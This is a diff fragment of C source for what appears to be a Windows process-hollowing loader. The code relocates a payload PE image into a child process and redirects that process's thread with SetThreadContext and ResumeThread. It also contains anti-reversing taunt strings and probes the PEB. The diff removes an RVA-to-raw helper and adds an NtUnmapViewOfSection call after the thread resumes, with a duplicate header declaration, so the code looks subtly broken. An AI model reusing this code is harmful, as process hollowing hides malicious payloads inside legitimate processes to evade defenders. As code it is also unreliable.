@@ -89,20 +89,6 @@ void test_phnt(void) {
       else printf("[*] CALL THE AMBULANCE BUT NOT FOR ME: %p\n", pbi.PebBaseAddress);
 }
 
-DWORD RVAToRAW(
-      DWORD rva,
-      PIMAGE_NT_HEADERS nt,
-      PIMAGE_SECTION_HEADER section 
-) {
-      for(WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
-            DWORD size = section->Misc.VirtualSize;
-            if(rva >= section->VirtualAddress && rva < section->VirtualAddress + size) {
-                  return section->PointerToRawData + (rva - section->VirtualAddress);
-            }
-      }
-      return 0;
-}
-
 int main() {
       WCHAR stop[] = L"Stop reversing the binary";
       WCHAR reconsider[] = L"Reconsider your life choices";
@@ -260,7 +246,6 @@ int main() {
            DWORD relocationOffset = 0;
 
            PIMAGE_SECTION_HEADER firstSectionHeader = IMAGE_FIRST_SECTION(payloadImageNTHeaders);
-           DWORD relocRaw = RVAToRAW(relocationTable.VirtualAddress, payloadImageNTHeaders, firstSectionHeader);
 
            while(relocationOffset < relocationTable.Size) {
             PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((uint8_t*)exec + payloadRelocationTableRaw + relocationOffset);
@@ -305,5 +290,9 @@ int main() {
       SetThreadContext(pi.hThread, context);
       ResumeThread(pi.hThread);
       int processError = GetLastError();
+      PIMAGE_NT_HEADERS payloadImageNTHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)exec + payloadDosHeader->e_lfanew);
+
+      NtUnmapViewOfSection(hChildProcess, destImageBase);
+
       return 0;
 }
